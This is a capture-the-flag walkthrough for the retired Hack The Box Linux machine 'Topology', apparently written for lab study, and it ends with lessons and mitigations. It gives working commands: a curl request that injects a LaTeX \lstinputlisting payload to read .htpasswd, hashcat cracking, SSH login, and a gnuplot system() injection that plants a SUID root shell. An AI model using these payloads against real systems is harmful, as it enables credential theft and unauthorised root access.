---
machine: Topology
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, latex, file-read, gnuplot, cron]
---

# Topology — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The LaTeX equation generator allows command injection and file reads with `\input` or `\lstinputlisting`. Recover the `dev` vhost `.htpasswd`, crack `vdaisley`'s password and log in over SSH. A cron runs gnuplot as root on a writable script; inject `system()` and gain root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 20.04 and `80/tcp` Apache serving `topology.htb`.
- The site is static and links to `latex.topology.htb/equation.php`.
- `ffuf` discovers `dev.topology.htb`, protected by basic auth.

## Enumeration

- `equation.php` renders LaTeX to an image and accepts `\input{...}`.
- `\lstinputlisting{/var/www/dev/.htpasswd}` returns `vdaisley`'s hash.
- `hashcat` cracks the hash and the password works over SSH.

## Foothold

Inject a file read into the LaTeX field to obtain `.htpasswd`; crack it and log in as `vdaisley`.

```bash
curl -s 'http://latex.topology.htb/equation.php' --data-urlencode 'equation=\lstinputlisting{/var/www/dev/.htpasswd}'
hashcat vdaisley.hash rockyou.txt
ssh vdaisley@topology.htb
```

## Lateral movement

There is no other host. The pivot is from the web to `.htpasswd`, then to `vdaisley` and the gnuplot cron.

## Privilege escalation

A root cron runs `gnuplot` on files in `/opt/topology`. The `.plt` script is writable by `vdaisley`; add `system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")` and wait for cron.

```bash
ls -l /opt/topology
echo 'system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")' >> /opt/topology/*.plt
/tmp/rootbash -p
```

## Evidence

- `.htpasswd` read with `\lstinputlisting`.
- Cracked hash and SSH as `vdaisley`.
- Modified gnuplot script and `/tmp/rootbash` with SUID.

## Lessons learned

- LaTeX can read files and run commands when unrestricted.
- An exposed `.htpasswd` enables attacks on basic auth.
- A cron running gnuplot on writable files is root execution.

## Mitigation and detection

- Run LaTeX in a sandbox without file or shell access.
- Protect `.htpasswd` and use strong passwords.
- Run gnuplot as an unprivileged user with read-only directories.

## References

- [0xdf — Topology](https://0xdf.gitlab.io/2023/11/04/htb-topology.html)
- [IppSec — Topology](https://www.youtube.com/watch?v=W1G11I_nMOQ)
- [Hack The Box — Topology](https://app.hackthebox.com/machines/topology)
